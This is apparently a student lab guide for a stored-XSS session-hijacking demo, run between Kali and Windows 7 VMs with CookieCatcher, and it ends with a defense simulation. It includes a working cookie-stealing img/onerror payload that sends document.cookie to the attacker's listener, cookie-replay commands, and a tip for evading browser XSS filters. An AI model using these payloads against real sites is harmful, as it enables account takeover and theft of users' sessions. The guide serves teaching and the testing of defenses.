# 🧪 Lab Guide — CookieCatcher Attack (Kali → Windows 7)

Step-by-step walkthrough for running the **Session Hijacking / MITM**
attack with **CookieCatcher** in your specific VirtualBox lab. Structured
to satisfy the 5 documentation requirements in the project brief.

> ⚠️ **Authorized lab use only.** Both VMs must be on a **Host-Only** /
> isolated network. Never run this against systems you do not own.

---

## 🗒️ Brief mapping (the 5 requirements)

| # | Requirement                                | Section below |
|---|--------------------------------------------|---------------|
| 1 | Who is involved (attacker & victim)        | §1            |
| 2 | When to conduct the attack                 | §2            |
| 3 | OS / platform / host (attacker & victim)   | §3            |
| 4 | Steps of the attack                        | §5–§9         |
| 5 | How many trials taken                      | §10           |

Plus: tool justification (§4) and defense simulation (§11).

---

## 1. Who is involved

| Role     | Identity      | IP address       | Function                                  |
|----------|---------------|------------------|-------------------------------------------|
| Attacker | Kali Linux VM | `192.168.56.102` | Hosts CookieCatcher + the vulnerable app  |
| Victim   | Windows 7 VM  | `192.168.56.101` | Browses the vulnerable page, gets cookies stolen |

For a clean academic story, treat the Kali box as both the **malicious
infrastructure** (CookieCatcher receiver) **and** the **vulnerable web
server** the victim visits — this avoids needing a third VM. In a real
attack these would be different machines.

---

## 2. When to conduct the attack

- **Trigger condition:** the victim has an authenticated session on the
  target site (a `PHPSESSID` cookie is set).
- **Pre-conditions on the target:**
  - No input sanitization (XSS is possible)
  - Cookie missing the `HttpOnly` flag
  - No Content-Security-Policy header
- **Window of exploitation:** as long as the session cookie is valid
  (default PHP session lifetime ~24 minutes idle).
- **Lab schedule (example):** demo session, **15:00–15:30**, after both
  VMs have booted and verified network reachability (§3.3).

---

## 3. OS / platform / host

### 3.1 Attacker — Kali Linux (`192.168.56.102`)
- OS: Kali Linux 2023.x (any recent build)
- Required: PHP 7.4+ (`php -v`)
- Network adapter: **Host-Only Adapter** in VirtualBox (e.g. `vboxnet0`)
- Roles served on this VM:
  - `:8080` → CookieCatcher receiver
  - `:8001` → Vulnerable guestbook (the target site)

### 3.2 Victim — Windows 7 (`192.168.56.101`)
- OS: Windows 7 SP1
- Browser: Internet Explorer 11 / Firefox ESR / Chrome (older build)
- Network adapter: **Host-Only Adapter** (same `vboxnet0`)

### 3.3 Pre-flight check (run on Kali)
```bash
# Confirm the IP
ip a | grep 192.168.56

# Confirm Win7 is reachable
ping -c 3 192.168.56.101
```
On Win7, open Command Prompt:
```cmd
ping 192.168.56.102
```
Both pings must succeed before continuing.

---

## 4. Justification — why CookieCatcher

| Criterion         | CookieCatcher | BeEF | Custom script |
|-------------------|---------------|------|---------------|
| Setup complexity  | Very low (PHP only) | High | Medium |
| Demonstrates concept | Excellent | Excellent | Depends |
| Educational clarity  | High | Medium | Low |
| Resource footprint | < 1 MB | ~200 MB | Varies |
| Fits assignment scope | ✅ | Overkill | ✅ |

CookieCatcher is the right tool for a focused, reproducible academic demo
of session hijacking via XSS.

---

## 5. STEP 1 — Get the demo code on Kali

The full demo lives in this repo under `demo-environment/`. On Kali:

```bash
# Install PHP if needed
sudo apt update && sudo apt install -y php-cli git

# Clone the project repo
cd ~
git clone https://github.com/KarlTheforest/session-hijacking-project.git
cd session-hijacking-project/demo-environment
```

You now have:
- `vulnerable-app/index.php` — the target page
- `attacker/cookiecatcher.php` — the cookie receiver
- `attacker/xss-payloads.txt` — ready-made payloads
- `secure-app/` — the hardened version (used in §11)

---

## 6. STEP 2 — Start the servers on Kali

Open **two terminals** on Kali (both inside `demo-environment/`):

**Terminal A — CookieCatcher (attacker receiver)**
```bash
php -S 0.0.0.0:8080 -t attacker attacker/cookiecatcher.php
```
You should see:
```
PHP X.Y.Z Development Server (http://0.0.0.0:8080) started
```

**Terminal B — Vulnerable guestbook (target)**
```bash
php -S 0.0.0.0:8001 -t vulnerable-app
```

Quick smoke test from Kali:
```bash
curl -s -o /dev/null -w "vuln  %{http_code}\n" http://192.168.56.102:8001
curl -s -o /dev/null -w "catch %{http_code}\n" http://192.168.56.102:8080
```
Both must return `200`.

---

## 7. STEP 3 — Confirm vulnerability from the victim (Win 7)

On the **Win 7 VM**, open the browser and go to:
```
http://192.168.56.102:8001
```
You should see the "Vulnerable Guestbook (LAB ONLY)" page with a session
cookie set. Open DevTools (F12) → Console → type:
```js
document.cookie
```
You should be able to read `PHPSESSID=...` — that proves the cookie has
**no** `HttpOnly` flag, so JavaScript can steal it.

---

## 8. STEP 4 — Inject the XSS payload

Still on **Win 7**, in the comment box of the vulnerable guestbook,
paste this **exact** payload (already targets your Kali IP):

```html
<img src=x onerror="this.src='http://192.168.56.102:8080/?c='+document.cookie">
```

Click **Submit**, then **reload the page** (F5) so the stored payload
executes from the server response.

What happens behind the scenes:
1. Browser tries to load image `src=x` → fails.
2. `onerror` JavaScript runs.
3. The browser sends `document.cookie` to
   `http://192.168.56.102:8080/?c=...`
4. CookieCatcher logs the request and returns a 1×1 GIF (no visible
   indication for the victim).

---

## 9. STEP 5 — Capture and replay the session (the hijack)

### 9.1 View the capture on Kali
- **Terminal A** (CookieCatcher) prints:
  ```
  === COOKIE CAPTURED ===
  TIME       : 2026-05-31 15:07:42
  SOURCE_IP  : 192.168.56.101
  USER_AGENT : Mozilla/5.0 (Windows NT 6.1; ...) Firefox/...
  COOKIE     : PHPSESSID=abc123xyz789
  =======================
  ```
- Or open the dashboard in a Kali browser:
  `http://192.168.56.102:8080`

Note the captured value, e.g. `PHPSESSID=abc123xyz789`.

### 9.2 Replay the cookie (impersonate the victim) — from Kali
```bash
curl -i -b "PHPSESSID=abc123xyz789" http://192.168.56.102:8001
```
The response body shows the page rendered **as the victim** (same
`username` and `session_id` as on Win 7).

You can also use a Kali browser:
1. Open `http://192.168.56.102:8001`
2. DevTools → Application → Cookies → set
   `PHPSESSID = abc123xyz789` → reload.

✅ **Session hijacked — without ever knowing the victim's password.**

---

## 10. Trials & evidence to record

Run the attack at least 3 times so you can show repeatability and
edge cases. Suggested trial table:

| Trial | Payload                                        | Result        | Time stolen → captured | Notes |
|-------|------------------------------------------------|---------------|------------------------|-------|
| 1     | `<script>...document.cookie</script>`          | ❌ blocked / ✅ stolen | — | tests basic filters |
| 2     | `<img src=x onerror="...document.cookie">`     | ✅ stolen     | ~1 s                   | recommended payload |
| 3     | `<img src=x onerror="...btoa(document.cookie)">` | ✅ stolen     | ~1 s                   | base64 encoded |
| 4     | Same payload **on the secure app** (§11)       | ❌ blocked / empty | —                 | proves the defense  |
| 5     | Replay stolen cookie from Kali                  | ✅ hijack     | n/a                    | impersonation works |

For each trial, capture **screenshots**:
1. Vulnerable page on Win 7 with the payload submitted.
2. CookieCatcher terminal showing the captured cookie.
3. CookieCatcher dashboard (`:8080`) entry.
4. Kali browser/cURL showing access **as the victim**.
5. Secure app rejecting the same payload (for trial 4).

---

## 11. Defense simulation (required by the brief)

Start the hardened version on Kali:
```bash
php -S 0.0.0.0:8002 -t secure-app
```
On Win 7, browse to `http://192.168.56.102:8002` and repeat **STEP 4**
with the same payload. Observe:

| Layer | What you should see                                         |
|-------|-------------------------------------------------------------|
| #1 HttpOnly cookie | `document.cookie` no longer shows `PHPSESSID` |
| #2 CSP             | Browser console: "Refused to execute inline ..." |
| #3 Input encoding  | If stored, payload renders as text, not executed |
| #4 WAF filter      | POST returns **HTTP 403 — blocked by WAF**       |
| #5 Session binding | Replaying the cookie from Kali → **HTTP 403**    |

Confirm CookieCatcher (`:8080`) logs **no new entry** for the secure app.

---

## 12. Cleanup

On Kali, in each server terminal: **Ctrl+C** to stop.

Reset demo state between runs:
```bash
rm -f vulnerable-app/comments.txt \
      secure-app/comments.txt \
      attacker/captured_cookies.log
```

---

## 13. Troubleshooting

- **No capture appears** → use the literal IP `192.168.56.102` in the
  payload (not `localhost`); confirm Win7 can `ping 192.168.56.102`.
- **`Connection refused` from Win7** → the PHP server must be bound to
  `0.0.0.0`, not `127.0.0.1`. Check your `php -S` flag.
- **Kali firewall** blocks ports → `sudo ufw allow 8001,8080,8002/tcp`.
- **Browser silently strips the payload** → some modern browsers run an
  XSS auditor. Use Internet Explorer 11 on Win 7 (no XSS auditor) or
  Firefox with `browser.urlbar.filter.javascript = false`.
- **Cookie not set on secure app over plain HTTP** → the secure app
  intentionally calls `SecureSession::start(false)` to allow HTTP for
  the demo. In production set it to `true` and serve over HTTPS.

---

## 14. Quick checklist for your report

- [ ] Network diagram showing `192.168.56.102` ↔ `192.168.56.101`
- [ ] Tool justification (§4 table)
- [ ] All five "who/when/OS/steps/trials" requirements answered
- [ ] At least 3 attack trials with screenshots
- [ ] Defense simulation results (§11 table)
- [ ] Ethical statement: lab-only, isolated host-only network, authorized
